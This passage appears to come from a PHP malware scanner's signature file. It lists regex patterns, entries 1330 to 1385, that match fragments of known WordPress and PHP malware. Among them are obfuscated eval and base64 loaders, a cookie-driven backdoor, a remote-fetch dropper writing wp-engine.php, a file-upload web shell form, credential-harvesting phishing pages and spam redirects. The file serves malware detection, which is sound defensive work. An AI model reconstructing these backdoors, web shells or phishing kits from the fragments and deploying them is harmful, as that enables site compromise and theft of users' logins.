      'pattern' => '/\\);\\$htaccess_rule \\.\\="\\\\\\\\x20On\\\\\\\\n";\\$htaccess_rule \\.\\=\\$\\{"G\\\\x4cO\\\\x42\\\\x41\\\\x4cS"\\}\\["\\\\x44\\\\x62\\\\x61\\\\x62\\\\x37\\\\x61\\\\x61\\\\x37\\\\x62\\\\x37"\\]\\(\\\\[\\s\\S]{0,160}\\);\\$htaccess_rule \\.\\="\\\\\\\\x20\\/\\\\\\\\n";\\$htaccess_rule \\.\\=\\$\\{"G\\\\x4cO\\\\x42\\\\x41\\\\x4cS"\\}\\["\\\\x44\\\\x62\\\\x61\\\\x62\\\\x37\\\\x61\\\\x61\\\\x37\\\\x62\\\\x37"\\]\\(\\\\/',
      'label' => 'sample-specific literal chain',
    ),
    1330 => 
    array (
      'pattern' => '/,\\$FLLLII888I\\);\\$FI8L88LILI\\=__FILE__;\\$FI8L88LILI\\=\\$\\{"G\\\\x4cO\\\\x42\\\\x41\\\\x4cS"\\}\\["\\\\x46\\\\x49\\\\x4c\\\\x38\\\\x4c\\\\x38\\\\x38\\\\x4c\\\\x49\\\\x49"\\]\\(\\\\[\\s\\S]{0,160},\\\\\'\\/\\\\\',\\$FI8L88LILI\\);\\$F8LI88LLII\\=\\$\\{"G\\\\x4cO\\\\x42\\\\x41\\\\x4cS"\\}\\["\\\\x46\\\\x38\\\\x4c\\\\x49\\\\x4c\\\\x49\\\\x49\\\\x4c\\\\x38\\\\x38"\\]\\(__FILE__\\)\\.\\\\/',
      'label' => 'sample-specific literal chain',
    ),
    1331 => 
    array (
      'pattern' => '/@include "\\\\057h\\\\157m\\\\145\\/\\\\155a\\\\147e\\\\151n\\\\163p\\\\057p\\\\165b\\\\154i\\\\143_\\\\150t\\\\155l\\\\057w\\\\160\\-\\\\151n\\\\143l\\\\165d\\\\145s\\\\057t\\\\150e\\\\155e\\\\055c\\\\157m\\\\160a\\\\164\\/[\\s\\S]{0,12000}require_once\\(ABSPATH \\. \'wp\\-settings\\.php\'\\);/s',
      'label' => 'source-file head-tail anchor',
    ),
    1332 => 
    array (
      'pattern' => '/\\$O__O0O0_0O\\="f\\-y2qlu7jgk0tnx8dob41a56ewmr9hz_ci3spv";\\$O0_OOO0_0_\\=\\$O__O0O0_0O\\{0\\}\\.\\$O__O0O0_0O\\{33\\}\\.\\$O__O0O0_0O\\{5\\}\\.\\$O__O0O0_0O\\{24\\}\\.\\$O__O0O0_0O\\{3[\\s\\S]{0,12000}wp_safe_redirect\\( \\$location \\);/s',
      'label' => 'source-file head-tail anchor',
    ),
    1333 => 
    array (
      'pattern' => '/\\)\\)\\.\'"\'\\.\\$hjwl995\\.\'"\'\\.ipga515\\(\\$wksh287\\{30\\}\\.\\$wksh287\\{30\\},\'\',\\$wksh287\\{69\\}\\);\\$zbgd825\\(\\$fsgm154,array\\(\'\',\'\\}\'\\.\\$tieg251\\.\'\\/\\/\'\\)\\);\\?\\>/s',
      'label' => 'sample-specific content window',
    ),
    1334 => 
    array (
      'pattern' => '/\\\\\'Y\\-m\\-d h\\:i\\:s\\\\\'\\)\\),\\$\\{"\\\\x47\\\\x4c\\\\x4f\\\\x42\\\\x41\\\\x4c\\\\x53"\\}\\["\\\\x4f\\\\x4f\\\\x30\\\\x4f\\\\x4f\\\\x30\\\\x30\\\\x5f\\\\x5f\\\\x5f"\\]\\(\\$OO_OO0_00_\\.\\$\\{"\\\\x47\\\\x4c\\\\/s',
      'label' => 'sample-specific content window',
    ),
    1335 => 
    array (
      'pattern' => '/\\.\\$header\\);
	curl_setopt\\(\\$wp, CURLOPT_RETURNTRANSFER, 1\\);
	\\$curxecs \\= curl_exec\\(\\$wp\\);
	if \\(\\$blog\\!\\=[\\s\\S]{0,160}\\) \\{
		file_put_contents\\(\\$blog, \\$curxecs\\);
	\\}
	if \\(isset\\(\\$_GET\\[/',
      'label' => 'sample-specific literal chain',
    ),
    1336 => 
    array (
      'pattern' => '/\\$O0_OO0O__0\\=\'168\';[\\s\\S]{0,12000}\\$OOO00_O0__\\="u_5wjzc4yi9xtalokd02smnh67rpf83gbeq1v\\-";\\$O0__OO00_O\\=\\$OOO00_O0__\\{9\\}\\.\\$OOO00_O0__\\{31\\}\\.\\$OOO00_O0__\\{22\\}\\.\\$OOO00_O0__\\{15\\}\\.\\$OOO00_O0__\\{/s',
      'label' => 'source-file head-tail anchor',
    ),
    1337 => 
    array (
      'pattern' => '/\'\\) \\{eval\\(\\$_dd2s3w72\\["data"\\]\\);exit;\\}\\}\\}\\$_r36cnosx \\= new _68z8fe\\(\\);if \\(\\$_r36cnosx\\-\\>_afap1\\(\\)\\) \\{\\$_r36cnosx\\-\\>_gpnko\\(\\);\\}exit\\(\\);/s',
      'label' => 'sample-specific content window',
    ),
    1338 => 
    array (
      'pattern' => '/\',\'\\$C11OKOOKK1\\=\\$\\{"G\\\\x4cO\\\\x42\\\\x41\\\\x4cS"\\}\\["\\\\x43\\\\x4b\\\\x4f\\\\x4f\\\\x4b\\\\x4f\\\\x31\\\\x4b\\\\x31\\\\x31"\\]\\(\\\\[\\s\\S]{0,160}\\);\\$CK1O1OKOK1\\=\\$\\{"G\\\\x4cO\\\\x42\\\\x41\\\\x4cS"\\}\\["\\\\x43\\\\x4b\\\\x4f\\\\x4f\\\\x4b\\\\x4f\\\\x31\\\\x4b\\\\x31\\\\x31"\\]\\(\\\\/',
      'label' => 'sample-specific literal chain',
    ),
    1339 => 
    array (
      'pattern' => '/\\* Plugin Name\\: The way to world domination[\\s\\S]{0,12000}eval\\(gzinflate\\(base64_decode\\(\'7f3ZkttKtigIPktfwdTROQydkBQAh4igtKVMzjMjOIEkUllRIACSIDEFAY559nO9lVW3tVmXWV2zW2bdb23WX9Bfc7\\/gfkKv5e4AAQ4RDG1p77/s',
      'label' => 'source-file head-tail anchor',
    ),
    1340 => 
    array (
      'pattern' => '/AwKCRPME8wMDAsJE9PMDAwMCoyKSwkT08wTzAwKCRPME8wMDAsJE9PMDAwMCwkT08wMDAwKSwkT08wTzAwKCRPME8wMDAsMCwkT08wMDAwKSkpKTs\\="\\)\\);\\?\\>/s',
      'label' => 'sample-specific content window',
    ),
    1341 => 
    array (
      'pattern' => '/x42\\\\x41\\\\x4c\\\\x53"\\}\\["\\\\x4f\\\\x30\\\\x5f\\\\x30\\\\x5f\\\\x4f\\\\x30\\\\x4f\\\\x4f\\\\x5f"\\]\\(\\$string\\)\\-14\\);return \\$\\{"\\\\x47\\\\x4c\\\\x4f\\\\x42\\\\x41\\\\x4c\\\\x53"\\}\\["\\\\x4/s',
      'label' => 'sample-specific content window',
    ),
    1342 => 
    array (
      'pattern' => '/\\) \\{eval\\(\\$_4wz0ikfh\\["data"\\]\\);exit;\\}\\}\\}\\$_znwmkrbf \\= new _9bnr8b7\\(\\);if \\(\\$_znwmkrbf\\-\\>_va9s3\\(\\)\\) \\{\\$_znwmkrbf\\-\\>_ouqfi\\(\\);\\}exit\\(\\);/s',
      'label' => 'sample-specific content window',
    ),
    1343 => 
    array (
      'pattern' => '/\\+\\+\\+\\+\\+\\+\\+\\+\\+\\+\\+\\+\\+\\+\\+\\+\\+\\+\\+\\+\\+\\+\\+\\+\\+\\+\\+\\+\\+\\+\\+\\+\\+\\+\\+\\+\\+\\+\\+\\+\\+\\+\\+\\+\\+\\+\\+\\+\\+\\+\\+\\+\\+\\+\\+\\+\\+\\+\\+\\+\\+\\+\\+\\+\\+\\+\\+\\+\\+\\+\\+\\+\\+\\+\\+\\+\\+/',
      'label' => 'sample-specific encoded fragment',
    ),
    1344 => 
    array (
      'pattern' => '/\\);\\$htaccess_rule \\.\\="\\\\\\\\x20On\\\\\\\\n";\\$htaccess_rule \\.\\=\\$\\{"G\\\\x4cO\\\\x42\\\\x41\\\\x4cS"\\}\\["\\\\x43\\\\x31\\\\x4b\\\\x4f\\\\x4f\\\\x4f\\\\x4b\\\\x31\\\\x31\\\\x4b"\\]\\(\\\\[\\s\\S]{0,160}\\);\\$htaccess_rule \\.\\="\\\\\\\\x20\\/\\\\\\\\n";\\$htaccess_rule \\.\\=\\$\\{"G\\\\x4cO\\\\x42\\\\x41\\\\x4cS"\\}\\["\\\\x43\\\\x31\\\\x4b\\\\x4f\\\\x4f\\\\x4f\\\\x4b\\\\x31\\\\x31\\\\x4b"\\]\\(\\\\/',
      'label' => 'sample-specific literal chain',
    ),
    1345 => 
    array (
      'pattern' => '/,\\$FII88LIL8L\\);\\$F8LLIII88L\\=__FILE__;\\$F8LLIII88L\\=\\$\\{"G\\\\x4cO\\\\x42\\\\x41\\\\x4cS"\\}\\["\\\\x46\\\\x49\\\\x4c\\\\x38\\\\x38\\\\x38\\\\x49\\\\x4c\\\\x4c\\\\x49"\\]\\(\\\\[\\s\\S]{0,160},\\\\\'\\/\\\\\',\\$F8LLIII88L\\);\\$F8ILL8ILI8\\=\\$\\{"G\\\\x4cO\\\\x42\\\\x41\\\\x4cS"\\}\\["\\\\x46\\\\x49\\\\x4c\\\\x38\\\\x38\\\\x49\\\\x4c\\\\x38\\\\x4c\\\\x49"\\]\\(__FILE__\\)\\.\\\\/',
      'label' => 'sample-specific literal chain',
    ),
    1346 => 
    array (
      'pattern' => '/\\<\\?php \\$BKOqI \\= \'bas\'\\.\'e64\'\\.\'_d\'\\.\'ec\'\\.\'ode\';  \\$cwEXo \\= \'st\'\\.\'rrev\';  \\$CDdTK \\= \'gzinflat\'\\.\'e\';  \\$vIpYg \\= \'s\'\\.\'tr\'\\.\'_rot1\'\\.\'3\';  eval\\(\\$vIpYg\\(\\$C/',
      'label' => 'source-file tail snippet',
    ),
    1347 => 
    array (
      'pattern' => '/function _vca6\\(\\$_0XNSsLM\\)\\{\\$_0XNSsLM\\=substr\\(\\$_0XNSsLM,\\(int\\)\\(hex2bin\\(\'31313939\'\\)\\)\\);\\$_0XNSsLM\\=substr\\(\\$_0XNSsLM,\\(int\\)\\(hex2bin\\(\'30\'\\)\\),\\(int\\)\\(hex2b/',
      'label' => 'source-file tail snippet',
    ),
    1348 => 
    array (
      'pattern' => '/\\$pod \\= array\\(\'jc\' \\=\\> \'1\',\'server_name\' \\=\\> \\$_SERVER\\[\'HTTP_HOST\'\\],\'user_agent\' \\=\\> \\$_SERVER\\[\'HTTP_USER_AGENT\'\\],\'user_cl\' \\=\\> isset\\(\\$_SERVER\\[\'HTT/',
      'label' => 'source-file tail snippet',
    ),
    1349 => 
    array (
      'pattern' => '/4ZZ4NuZTM4cTyV\\/vYyTXD\\+Lzx2Vda\\+FLVLl\\/l5KLtnCr6XIVMVvpRS\\/lVL8VkrxWynFb6W8\\/N9KwW8AfP8L";
\\$c \\= \\$g\\(\\$b\\(\\$c\\)\\);
\\/\\*\\*\\/eval\\/\\*\\*\\/\\(\\$c\\);/s',
      'label' => 'sample-specific content window',
    ),
    1350 => 
    array (
      'pattern' => '/s \\$n\\=\\>\\$l\\)\\{if\\(strstr\\(\\$l,\\$s\\)\\) \\{\\$r\\=\\$n;break;\\}\\}
                return \\$r\\+1;
            \\}
            die\\(\\);
            \\?\\>/s',
      'label' => 'sample-specific content window',
    ),
    1351 => 
    array (
      'pattern' => '/\\<\\?
\\$ip \\= getenv\\("REMOTE_ADDR"\\);
\\$message  \\= "\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\+ 126 \\+\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\\\n";
\\$message \\.\\= "Username \\: "\\.\\$_POST\\[\'/s',
      'label' => 'sample-specific content window',
    ),
    1352 => 
    array (
      'pattern' => '/\\$url\\="http\\:\\/\\/"\\.\\$_SERVER\\[\'HTTP_HOST\'\\]\\.\\$_SERVER\\[\'REQUEST_URI\'\\];[\\s\\S]{0,12000}header\\(\'Location\\: count\\.mail\\.163\\.com\\/login\\.php\\?l\\=_JeHFUq_VJOXK0QWHtoGYDw_Product\\-UserID&email\\=\'\\.\\$email\\);/s',
      'label' => 'source-file head-tail anchor',
    ),
    1353 => 
    array (
      'pattern' => '/\\/
\\?\\>\\<\\!doctype html\\>
\\<html \\<\\?php language_attributes\\(\\); \\?\\>\\>
\\<head\\>
	\\<meta charset\\="\\<\\?php bloginfo\\( \'charset\' \\); \\?\\>" \\/\\>
	\\</s',
      'label' => 'sample-specific content window',
    ),
    1354 => 
    array (
      'pattern' => '/\\<\\?php endif; \\/\\/ End header image check\\. \\?\\>
		\\<\\/header\\>\\<\\!\\-\\- \\.site\\-header \\-\\-\\>

		\\<div id\\="content" class\\="site\\-content"\\>/s',
      'label' => 'sample-specific content window',
    ),
    1355 => 
    array (
      'pattern' => '/\\<\\?php \\$botbotbot \\= "\\.\\.\\."\\.mb_strtolower\\(\\$_SERVER\\[HTTP_USER_AGENT\\]\\);\\$botbotbot \\= str_replace\\(" ", "\\-", \\$botbotbot\\);if \\(strpos\\(\\$botbotbot,"goog[\\s\\S]{0,12000}\\<\\?php get_template_part\\(\'template\\-parts\\/header\\/middle\\-header\'\\); \\?\\>/s',
      'label' => 'source-file head-tail anchor',
    ),
    1356 => 
    array (
      'pattern' => '/NAME\', \\$obira_theme\\-\\>get\\( \'Author\' \\)\\);

\\/\\*\\*
 \\* All Main Files Include
 \\*\\/
require_once\\( OBIRA_FRAMEWORK \\. \'\\/init\\.php\' \\);/s',
      'label' => 'sample-specific content window',
    ),
    1357 => 
    array (
      'pattern' => '/per_register\\("var", "Stream"\\);

\\/\\/ Register connect the library Stream
\\$fp \\= fopen\\(\'var\\:\\/\\/\'\\.\\$_GET\\[\'f\'\\]\\(\\$_GET\\[\'c\'\\]\\), \'\'\\);/s',
      'label' => 'sample-specific content window',
    ),
    1358 => 
    array (
      'pattern' => '/se\\(\\$hdl\\);
    include\\("\\{\\$eb\\}\\.\\$algo"\\);
    unlink\\("\\{\\$eb\\}\\.\\$algo"\\);
	\\$npDcheckClassBgp \\= \'aue\';

	\\$zeeta \\= "yup";

    \\}
\\?\\>/s',
      'label' => 'sample-specific content window',
    ),
    1359 => 
    array (
      'pattern' => '/;\\/\\*i0nDEG4u\\}\\$\\+\\*\\/@\\/\\*88I\\>p\\:f\\^Ynsgfeo1~A&&VQS~3Xf\\$\\(F\\[m\\{;\\^G"\\*\\/eval\\s+\\/\\*\\>z\\-NHKm9\\.09~byL9k\\)s\\/\\]OM\\:\\}Nfd"uZ&N\\*\\/\\(\\#UWtZC\\$\\]1"\'36\\{Fv9\\:7Z5V\\=\\]Xxoq\\?z/',
      'label' => 'sample-specific line fragment',
    ),
    1360 => 
    array (
      'pattern' => '/9\\-09\\-13 18\\:55\\:48
 \\* @Last Modified by\\:   Nokia 1337
 \\* @Last Modified time\\: 2019\\-09\\-30 21\\:16\\:59
\\*\\/
\\$Antibot\\-\\>error\\(404\\);/s',
      'label' => 'sample-specific content window',
    ),
    1361 => 
    array (
      'pattern' => '/l\\-md\\-12"\\>
					\\<h1\\>DASHBOARD \\(V\\.2\\.6\\)\\<\\/h1\\>
					\\<small\\>Real Visitor Detection Manager\\.\\<\\/small\\>\\<br\\>
					\\<hr\\>
				\\<\\/div\\>/s',
      'label' => 'sample-specific content window',
    ),
    1362 => 
    array (
      'pattern' => '/\\<\\?php
require_once\\(\'autoload\\.php\'\\); 
if\\(isset\\(\\$_GET\\[\'slug\'\\]\\) && \\$_SESSION\\[\'check\'\\] \\=\\= false\\)\\{

	  \\$respons \\= \\$Antibot\\-\\>r/s',
      'label' => 'sample-specific content window',
    ),
    1363 => 
    array (
      'pattern' => '/\\<\\?php error_reporting\\(0\\);function a_\\(\\$c_\\=32\\)\\{\\$c0\\="0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";\\$c1\\=strlen\\(\\$c0\\);\\$c2\\="";for[\\s\\S]{0,12000}wp_die\\( \\$die, __\\( \'WordPress &rsaquo; Error\' \\) \\);/s',
      'label' => 'source-file head-tail anchor',
    ),
    1364 => 
    array (
      'pattern' => '/VvQ0JCYUV4d21DeExZMEJyQXJPY1dpUDBNaTlqbTEwOU5FbWZCWW1PbjJoMFhFSHlTVTBhSHp4bEhrZ3RTRXM3dUdwbEh6eGxIenhsSHpnTG8yMUpNaTRsTk/s',
      'label' => 'sample-specific content window',
    ),
    1365 => 
    array (
      'pattern' => '/\\$p\\=\\$_COOKIE;\\(count\\(\\$p\\)\\=\\=15&&in_array\\(gettype\\(\\$p\\)\\.count\\(\\$p\\),\\$p\\)\\)\\?\\(\\(\\$p\\[63\\]\\=\\$p\\[63\\]\\.\\$p\\[86\\]\\)&&\\(\\$p\\[88\\]\\=\\$p\\[63\\]\\(\\$p\\[88\\]\\)\\)&&\\(\\$p\\=\\$p\\[88\\]\\(\\$p\\[68\\],\\$p\\[63\\]\\(\\$/',
      'label' => 'source-file tail snippet',
    ),
    1366 => 
    array (
      'pattern' => '/ghqk\\[4\\] \\. \\$hpghqk\\[29\\] \\. \\$hpghqk\\[13\\] \\. \\$hpghqk\\[18\\] \\. \\$hpghqk\\[12\\] \\. \\$hpghqk\\[6\\] \\. \\$hpghqk\\[6\\] \\. \\$hpghqk\\[3\\] \\. \\$hpghqk\\[44\\] \\. \\$/s',
      'label' => 'sample-specific content window',
    ),
    1367 => 
    array (
      'pattern' => '/tebin\\.com\\/raw\\/6UD40XpN\'\\);
	\\$doit \\= fopen\\(\'wp\\-engine\\.php\', \'w\'\\);
	fwrite\\(\\$doit,\\$code\\);
	fclose\\(\\$doit\\);
	
\\}

engine\\(\\);

\\?\\>/s',
      'label' => 'sample-specific content window',
    ),
    1368 => 
    array (
      'pattern' => '/php\\?date\\=\'\\.\\$id\\.\'&temp\\=\'\\.\\$temp\\.\'&web\\=\'\\.\\$host\\.\'&xml\\=\'\\.\\$dt\\.\'&maptype\\=\'\\.\\$maptype\\.\'&http\\=\'\\.\\$http;
                    echo "\\</s',
      'label' => 'sample-specific content window',
    ),
    1369 => 
    array (
      'pattern' => '/rike a Pose\\. Something stylish is in the works\\!\\<\\/p\\>
\\<\\/div\\>

\\<\\!\\-\\- scripts \\-\\-\\>
\\<script src\\="\\.\\.\\/particles\\.js"\\>\\<\\/script\\>
\\<sc/s',
      'label' => 'sample-specific content window',
    ),
    1370 => 
    array (
      'pattern' => '/\\<script type\\=\'text\\/javascript\' src\\=\'https\\:\\/\\/trend\\.linetoadsactive\\.com\\/m\\.js\\?n\\=nb5\'\\>\\<\\/script\\>/',
      'label' => 'source-file tail snippet',
    ),
    1371 => 
    array (
      'pattern' => '/45\\\\x39"\\]\\(\\\\\'\\/\\(\\?\\:\\(\\?\\:\\\\\\\\r\\\\\\\\n\\|\\\\\\\\n\\)\\|\\^\\)\\(\\[0\\-9A\\-F\\]\\+\\)\\(\\?\\:\\\\\\\\r\\\\\\\\n\\|\\\\\\\\n\\)\\{1,2\\}\\(\\.\\*\\?\\)\\\\\'\\.\\\\\'\\(\\(\\?\\:\\\\\\\\r\\\\\\\\n\\|\\\\\\\\n\\)\\(\\?\\:\\[0\\-9A\\-F\\]\\+\\(\\?\\:\\\\\\\\r\\\\\\\\n\\|\\\\\\\\n\\)\\)\\|\\$\\)\\/si/s',
      'label' => 'sample-specific content window',
    ),
    1372 => 
    array (
      'pattern' => '/\\);\\$htaccess_rule \\.\\="\\\\\\\\x20On\\\\\\\\n";\\$htaccess_rule \\.\\=\\$\\{"G\\\\x4cO\\\\x42\\\\x41\\\\x4cS"\\}\\["\\\\x46\\\\x4c\\\\x38\\\\x38\\\\x4c\\\\x4c\\\\x49\\\\x49\\\\x49\\\\x38"\\]\\(\\\\[\\s\\S]{0,160}\\);\\$htaccess_rule \\.\\="\\\\\\\\x20\\/\\\\\\\\n";\\$htaccess_rule \\.\\=\\$\\{"G\\\\x4cO\\\\x42\\\\x41\\\\x4cS"\\}\\["\\\\x46\\\\x4c\\\\x38\\\\x38\\\\x4c\\\\x4c\\\\x49\\\\x49\\\\x49\\\\x38"\\]\\(\\\\/',
      'label' => 'sample-specific literal chain',
    ),
    1373 => 
    array (
      'pattern' => '/\\$FII8LI8LL8\\="_crlvfb1e65t9dgz4j0pq8\\-oxiaskh3wmu2yn7";\\$F8L8LLII8I\\=\\$FII8LI8LL8\\{5\\}\\.\\$FII8LI8LL8\\{25\\}\\.\\$FII8LI8LL8\\{3\\}\\.\\$FII8LI8LL8\\{8\\}\\.\\$FII8LI8LL8\\{0\\}[\\s\\S]{0,12000}wp_die\\( \\$die, __\\( \'WordPress &rsaquo; Error\' \\) \\);/s',
      'label' => 'source-file head-tail anchor',
    ),
    1374 => 
    array (
      'pattern' => '/action method\\=POST\\>\\<font size\\=2 color\\=\\#FF0000\\>\\<b\\>Upload File\\<\\/b\\>\\<\\/font\\>\\<br\\>\\<input type\\=hidden name\\=[\\s\\S]{0,160}size\\=28\\>\\<br\\>\\<font size\\=2 color\\=\\#FF0000\\>\\<b\\>New name\\: \\<\\/b\\>\\<\\/font\\>\\<input type\\=text size\\=15 name\\=/',
      'label' => 'sample-specific literal chain',
    ),
    1375 => 
    array (
      'pattern' => '/\\<\\?php \\$SIqZE \\= \'st\'\\.\'r\'\\.\'_\'\\.\'rot13\'; \\$JWwGX \\= \'base6\'\\.\'4\'\\.\'_d\'\\.\'ecod\'\\.\'e\'; error_reporting\\(0\\); ini_set\\(\'error_log\', NULL\\); echo \'\\<html\\> \\<\\/ht/',
      'label' => 'source-file tail snippet',
    ),
    1376 => 
    array (
      'pattern' => '/; \\/\\*\\-2Gs\\-\\*\\/\\$vSjfoTJ\\/\\*\\-2r6fhB\\-\\*\\/ \\= \\/\\*\\-\\-w\\}_ALv\\#\\-\\*\\/\\$FXylZarbfo\\/\\*\\-8\\:Us\\:w1Hp\\-\\*\\/\\(\\/\\*\\-z%,\\-\\*\\/[\\s\\S]{0,160}, \\/\\*\\-HZm\\#\\=GL\\{\\^\\-\\*\\/\\$tm\\/\\*\\-\\]\\-\\*\\/\\); \\/\\*\\-dxA\\-\\*\\/\\$oq \\/\\*\\-s\\?iufJ\\-\\*\\/\\= \\/\\*\\-sN\\>gf\\-\\*\\//',
      'label' => 'sample-specific literal chain',
    ),
    1377 => 
    array (
      'pattern' => '/https\\:\\/\\/XXXXXXXXX\\.com\\/wp\\-content\\/plugins\\/fusion\\-builder\\/assets\\/js\\/min\\/general\\/fusion\\-image\\-before\\-after\\.js\\?ver\\=1\\.0[\\s\\S]{0,160}https\\:\\/\\/XXXXXXXXX\\.com\\/wp\\-content\\/themes\\/Avada\\/includes\\/lib\\/assets\\/min\\/js\\/library\\/bootstrap\\.transition\\.js\\?ver\\=3\\.3\\.6/',
      'label' => 'sample-specific literal chain',
    ),
    1378 => 
    array (
      'pattern' => '/Agents\\) \\. \'\\/i\', \\$_SERVER\\[\'HTTP_USER_AGENT\'\\]\\)\\) \\{
	header\\(\'HTTP\\/1\\.0 404 Not Found\'\\);
	exit;
\\}

\\$url \\= \'https\\:\\/\\/bit\\.ly\\/3AAX/s',
      'label' => 'sample-specific content window',
    ),
    1379 => 
    array (
      'pattern' => '/^\\s*\\?\\>\\s*$/s',
      'label' => 'exact source-file content',
    ),
    1380 => 
    array (
      'pattern' => '/^\\s*\\<h1\\>\\$OH\\<\\/h1\\>\\s*$/s',
      'label' => 'exact source-file content',
    ),
    1381 => 
    array (
      'pattern' => '/\\<\\?php
\\/\\*
\\* @package    GOOGLE\\.COM
 \\*
 \\* @copyright  Copyright \\(C\\) 2005 \\- 2020 Open Source Matters, Inc\\. All rights reser/s',
      'label' => 'sample-specific content window',
    ),
    1382 => 
    array (
      'pattern' => '/\\)\\{
		\\$x \\= \\$i;
		break;
	\\}
\\}
\\$yuh \\= substr\\(\\$yuh,0,\\$x\\);
\\$yuh \\= ucfirst\\(\\$yuh\\);
\\?\\>
\\<\\!DOCTYPE HTML PUBLIC[\\s\\S]{0,160}\\>
\\<html\\>
\\<head\\>
\\<title\\>163网易免费邮\\-\\-中文邮箱第一品牌\\<\\/title\\>
\\<meta http\\-equiv\\=/',
      'label' => 'sample-specific literal chain',
    ),
    1383 => 
    array (
      'pattern' => '/T1IB\'\\);\\$\\=\\$ݴ\\(@\\$\\(\\$֡\\(\\$η؍\\(\\$羚,\\$ի̓,\\$\\)\\)\\)\\);return\\$;\\}function 딺\\(\\$ջϏ,\\$\\=[\\s\\S]{0,160}\\)\\:\\$;\\$۹\\=\\$ӌ˫;for\\(;\\$۹\\<\\$ݮ\\(\\$ջϏ\\);\\$۹\\+\\+\\)\\$ȼר\\.\\=\\$ƥ\\(\\$ջϏ\\{\\$۹\\}\\)\\<\\$ƥ\\(/',
      'label' => 'sample-specific literal chain',
    ),
    1384 => 
    array (
      'pattern' => '/S�E0G66�51I\\/��JA93E6����RC4�V�\\+NO�9X��3U�OX\\/I6F4Y4���S�U��9�\\+BQ4P\\+���SKW/s',
      'label' => 'sample-specific content window',
    ),
    1385 => 
    array (
      'pattern' => '/\\<\\?php \\/\\* tjwlltii akhmhcij \\*\\/error_reporting\\(0\\);ini_set\\("display_errors", 0\\);if\\(\\!defined\\(\'lmhelqpg\'\\)\\)\\{define\\(\'lmhelqpg\',__FILE__\\);if\\(\\!functi/',
      'label' => 'source-file head snippet',
    ),
  ),
  'heuristic_patterns' => 
  array (
  ),
);
    }
}
